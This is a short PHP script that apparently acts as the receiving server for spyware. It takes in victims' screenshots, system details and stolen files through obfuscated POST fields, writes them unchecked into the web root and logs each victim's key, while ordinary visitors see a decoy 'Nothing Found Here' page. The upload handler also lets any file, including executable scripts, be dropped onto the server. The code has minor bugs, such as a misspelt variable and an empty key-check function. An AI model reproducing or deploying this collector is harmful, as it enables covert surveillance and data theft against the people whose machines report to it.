<?php
	function key_check(){
		
	}

?>

<!DOCTYPE html>
<html>
	<head>
	</head>
<body>
	<?php 
		if(isset($_POST['owiev0w9ejh0923jhr4iamso'])){
			if(file_exists('log.txt')){
				$file = fopen('log.txt','a') or die("Error Opening File");
			} 
			else{
				$file = fopen('log.txt','w') or die("Error Opening File");
			}
			$string = 
				"\n\n" . 
				"#############################################\n\n";
			switch($_POST['iqjweoijqwoieiiwias']){ 			
				case "s823rjwoaiweiowe": // grab_screen
					if(isset($_FILES["s823rjwoaiweiowe"]["name"])){
						$screen_link = $_SERVER['DOCUMENT_ROOT'] . "/" .  $_FILES["s823rjwoaiweiowe"]["name"] ;
						$string .= $screen_link;
						move_uploaded_file( $_FILES["s823rjwoaiweiowe"]["tmp_name"] , $screen_link);
						$strin .=
							"File:" . $_FILES["file"]["name"] .
							"DateTime:" . date("j F Y h:i:s A");
					}
					else{
						fwrite($file,"Error while screenshot receiving");
					}
				break;
				case "iurkeilallaaowieo": 					// sys_info
					if(isset($_POST['asdqwzzxcvr34'])){
						$string .= 					 
							"System:" . $_POST['asdqwzzxcvr34'];
					}
					else{
						$string .= "Error while sys_info receiving sys_info";
					}
				break;
				case "ikdsoelllqkwoavvvv6":					// get_file
					if(isset($_FILES["ikdsoelllqkwoavvvv6"]["name"])){
						$file_link = $_SERVER['DOCUMENT_ROOT'] . "/" .  $_FILES["ikdsoelllqkwoavvvv6"]["name"] ;
						$string .= $file_link;
						move_uploaded_file( $_FILES["ikdsoelllqkwoavvvv6"]["tmp_name"] , $file_link);
						$strin .=
							"File:" . $_FILES["ikdsoelllqkwoavvvv6"]["name"] .
							"DateTime:" . date("j F Y h:i:s A");
					}
					else{
						$string .= "Error while file receiving";
					}					
				break;
			}
			$string .= 
				"\n\n#############################################" .
				"\n|Key:" . $_POST['owiev0w9ejh0923jhr4iamso'] . "|\n\n";			
			fwrite($file,$string);
			fclose($file);
		}	
		else{
	?>
		<span> Nothing Found Here.</span>
<?php

	}
	
?>
	</body>
</html>
